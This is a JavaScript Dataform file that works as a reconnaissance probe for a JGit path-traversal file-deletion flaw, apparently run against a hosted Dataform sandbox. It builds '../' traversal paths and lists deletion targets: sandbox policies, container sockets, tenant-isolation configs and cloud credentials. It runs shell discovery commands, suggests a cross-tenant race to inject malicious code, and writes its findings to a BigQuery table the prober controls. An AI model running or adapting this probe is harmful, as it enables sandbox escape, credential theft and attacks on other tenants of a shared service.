/**
 * JGit File Deletion Target Identification Probe
 *
 * Purpose: Identify high-value files that could be deleted via the JGit
 * vulnerability (path traversal in cleanUpConflicts)
 *
 * Attack Flow:
 * 1. Git checkout triggers D/F conflict
 * 2. cleanUpConflicts() deletes files at path without validation
 * 3. If path contains "../../../", files outside worktree are deleted
 *
 * We need to find:
 * 1. Where is the git worktree?
 * 2. What files relative to worktree would be valuable to delete?
 * 3. What sandbox config files exist?
 * 4. What cache/temp files are shared?
 */

const probeId = `jgit_targets_${Date.now()}`;
const results = {
  probeId: probeId,
  timestamp: new Date().toISOString(),
  worktree: {},
  targetAnalysis: {},
  pathTraversal: {},
  recommendations: []
};

// ============================================
// TEST 1: Worktree Location Discovery
// ============================================
try {
  if (typeof process !== "undefined") {
    results.worktree = {
      cwd: process.cwd(),
      env_pwd: process.env?.PWD,
      env_home: process.env?.HOME,
      dirname: typeof __dirname !== "undefined" ? __dirname : "N/A",
      platform: process.platform
    };

    // Calculate traversal paths
    const cwd = process.cwd();
    results.worktree.cwdParts = cwd.split("/").filter(Boolean);
    results.worktree.depth = results.worktree.cwdParts.length;

    // Generate path traversal strings
    const traversals = [];
    for (let i = 1; i <= Math.min(results.worktree.depth + 2, 10); i++) {
      traversals.push("../".repeat(i));
    }
    results.pathTraversal.traversalStrings = traversals;
  }
} catch (e) {
  results.worktree.error = e.message;
}

// ============================================
// TEST 2: High-Value Target Files Analysis
// ============================================
try {
  // These are the files we would want to delete for code execution
  // Format: { relativePath: string, purpose: string, impact: string }
  const targetFiles = [
    // Sandbox/Security Policy Files
    {
      path: "../../../etc/apparmor.d/dataform",
      purpose: "AppArmor policy",
      impact: "Disable AppArmor sandbox"
    },
    {
      path: "../../../etc/security/seccomp-bpf",
      purpose: "Seccomp BPF filter",
      impact: "Disable syscall filtering"
    },
    {
      path: "../../../run/containerd/containerd.sock",
      purpose: "Container runtime socket",
      impact: "Disrupt container management"
    },
    {
      path: "../../../var/run/docker.sock",
      purpose: "Docker socket",
      impact: "Disrupt container management"
    },

    // Node.js Module Files (for fallback attacks)
    {
      path: "node_modules/@dataform/core/package.json",
      purpose: "Core module manifest",
      impact: "Change module resolution"
    },
    {
      path: "node_modules/@dataform/core/index.js",
      purpose: "Core module entry",
      impact: "Force fallback to index.node"
    },
    {
      path: "../../../usr/local/lib/node_modules/@dataform/core/index.js",
      purpose: "Global dataform module",
      impact: "Affect all compilations"
    },

    // Configuration Files
    {
      path: "../../../etc/dataform/config.json",
      purpose: "Dataform config",
      impact: "Change compilation behavior"
    },
    {
      path: "../../../etc/dataform/sandbox_policy.json",
      purpose: "Sandbox policy",
      impact: "Disable sandbox"
    },
    {
      path: "../../../var/lib/dataform/tenant_isolation.conf",
      purpose: "Tenant isolation config",
      impact: "Break tenant isolation"
    },

    // Cache/Temp Files (for cross-tenant race)
    {
      path: "../../../tmp/dataform-cache/bundle.js",
      purpose: "Cached compilation",
      impact: "Cross-tenant code injection"
    },
    {
      path: "../../../var/cache/dataform/modules.json",
      purpose: "Module cache",
      impact: "Inject malicious modules"
    },

    // Credentials
    {
      path: "../../../etc/dataform/service_account.json",
      purpose: "Service account key",
      impact: "Credential theft/denial"
    },
    {
      path: "../../../root/.config/gcloud/application_default_credentials.json",
      purpose: "GCP credentials",
      impact: "Credential theft"
    },

    // Git-related
    {
      path: ".git/config",
      purpose: "Git config",
      impact: "Change git behavior"
    },
    {
      path: ".git/hooks/pre-commit",
      purpose: "Git hook",
      impact: "Bypass commit validation"
    },
    {
      path: "../.git/config",
      purpose: "Parent git config",
      impact: "Affect git operations"
    },

    // gVisor specific
    {
      path: "../../../dev/gvisor",
      purpose: "gVisor device",
      impact: "Disrupt gVisor sandbox"
    },
    {
      path: "../../../proc/self/uid_map",
      purpose: "User namespace map",
      impact: "Affect namespace isolation"
    }
  ];

  results.targetAnalysis = {
    totalTargets: targetFiles.length,
    targets: targetFiles,
    byImpact: {
      sandbox: targetFiles.filter(t => t.impact.includes("sandbox") || t.impact.includes("Sandbox")),
      isolation: targetFiles.filter(t => t.impact.includes("isolation")),
      credentials: targetFiles.filter(t => t.impact.includes("redential")),
      codeExecution: targetFiles.filter(t => t.impact.includes("inject") || t.impact.includes("fallback"))
    }
  };

  // Generate actual path strings for testing
  if (results.worktree.cwd) {
    const cwd = results.worktree.cwd;
    results.targetAnalysis.sampleAttackPaths = targetFiles.slice(0, 5).map(t => {
      // Calculate the full path from worktree
      const fullPath = cwd + "/" + t.path;
      // Normalize to see where it would resolve
      try {
        const path = require("path");
        const normalized = path.normalize(fullPath);
        return {
          relativePath: t.path,
          fromWorktree: fullPath,
          normalized: normalized,
          purpose: t.purpose
        };
      } catch (e) {
        return {
          relativePath: t.path,
          fromWorktree: fullPath,
          purpose: t.purpose
        };
      }
    });
  }
} catch (e) {
  results.targetAnalysis.error = e.message;
}

// ============================================
// TEST 3: Check which targets might exist
// ============================================
try {
  const fs = require("fs");
  const path = require("path");

  const existenceChecks = {};
  const checkPaths = [
    "/etc/apparmor.d",
    "/etc/security",
    "/etc/dataform",
    "/var/lib/dataform",
    "/tmp",
    "/var/cache",
    "/proc/self",
    "/dev"
  ];

  for (const p of checkPaths) {
    try {
      const stat = fs.statSync(p);
      const contents = stat.isDirectory() ? fs.readdirSync(p).slice(0, 10) : "file";
      existenceChecks[p] = {
        exists: true,
        isDir: stat.isDirectory(),
        contents: contents
      };
    } catch (e) {
      existenceChecks[p] = {
        exists: false,
        error: e.code
      };
    }
  }

  results.targetAnalysis.existenceChecks = existenceChecks;
} catch (e) {
  results.targetAnalysis.fsError = e.message;
}

// ============================================
// TEST 4: Shell-based Discovery (if available)
// ============================================
try {
  const cp = require("child_process");

  // If shell is available, do deeper discovery
  results.shellDiscovery = { available: true };

  // Find potential config files
  try {
    const findConfigs = cp.execSync(
      "find /etc -name '*dataform*' -o -name '*sandbox*' -o -name '*seccomp*' 2>/dev/null | head -20",
      { encoding: "utf8", timeout: 5000 }
    );
    results.shellDiscovery.configFiles = findConfigs.trim().split("\n").filter(Boolean);
  } catch (e) {
    results.shellDiscovery.findConfigsError = e.message;
  }

  // Check /proc for process info
  try {
    const procSelf = cp.execSync(
      "cat /proc/self/cgroup 2>/dev/null | head -10",
      { encoding: "utf8", timeout: 5000 }
    );
    results.shellDiscovery.cgroup = procSelf.trim();
  } catch (e) {}

  // Check for gVisor
  try {
    const gvisorCheck = cp.execSync(
      "dmesg 2>/dev/null | grep -i gvisor | head -5 || uname -a",
      { encoding: "utf8", timeout: 5000 }
    );
    results.shellDiscovery.gvisorCheck = gvisorCheck.trim();
  } catch (e) {}

  // List /tmp contents
  try {
    const tmpContents = cp.execSync(
      "ls -la /tmp/ 2>/dev/null | head -20",
      { encoding: "utf8", timeout: 5000 }
    );
    results.shellDiscovery.tmpContents = tmpContents;
  } catch (e) {}

  // Check git repo location
  try {
    const gitRoot = cp.execSync(
      "git rev-parse --show-toplevel 2>/dev/null || echo 'not a git repo'",
      { encoding: "utf8", timeout: 5000 }
    );
    results.shellDiscovery.gitRoot = gitRoot.trim();
  } catch (e) {}

} catch (e) {
  results.shellDiscovery = { available: false, error: e.message };
}

// ============================================
// Generate Recommendations
// ============================================
try {
  const recommendations = [];

  // Based on worktree depth
  if (results.worktree.depth) {
    const depth = results.worktree.depth;
    recommendations.push({
      priority: 1,
      action: `Use ${depth + 2} "../" to reach filesystem root from worktree`,
      path: "../".repeat(depth + 2),
      example: `${"../".repeat(depth + 2)}etc/dataform/sandbox_policy.json`
    });
  }

  // If shell is available
  if (results.shellDiscovery?.available) {
    recommendations.push({
      priority: 2,
      action: "Shell access available - can create corrupt git trees directly",
      method: "git mktree with path traversal"
    });
  }

  // If config files found
  if (results.shellDiscovery?.configFiles?.length > 0) {
    recommendations.push({
      priority: 3,
      action: "Target discovered config files for deletion",
      files: results.shellDiscovery.configFiles
    });
  }

  // Cross-tenant race condition
  recommendations.push({
    priority: 4,
    action: "Test cross-tenant race condition on shared paths",
    method: "Delete shared file, have another tenant write malicious content",
    targets: ["/tmp/*", "/var/cache/*"]
  });

  results.recommendations = recommendations;
} catch (e) {
  results.recommendations = [{ error: e.message }];
}

// ============================================
// Store Results
// ============================================

dataform.projectConfig.defaultDatabase = "shir-research-3";
dataform.projectConfig.defaultSchema = "dataform_poc";

operate("jgit_targets_results").queries([
  `-- JGit Deletion Targets Analysis - ${probeId}
   CREATE OR REPLACE TABLE \`shir-research-3.dataform_poc.jgit_deletion_targets\` AS
   SELECT
     '${probeId}' as probe_id,
     CURRENT_TIMESTAMP() as probe_time,
     '${results.worktree.cwd || "unknown"}' as worktree_cwd,
     ${results.worktree.depth || 0} as worktree_depth,
     ${results.shellDiscovery?.available || false} as shell_available,
     '''${JSON.stringify(results, null, 2).replace(/'/g, "\\'")}''' as full_results`
]);

publish("jgit_targets_summary").query(`
  SELECT
    '${probeId}' as probe_id,
    '${results.worktree.cwd || "unknown"}' as worktree,
    ${results.worktree.depth || 0} as depth,
    ${results.targetAnalysis?.totalTargets || 0} as target_count,
    ${results.shellDiscovery?.available || false} as shell_available,
    '${results.shellDiscovery?.gitRoot || "N/A"}' as git_root
`);
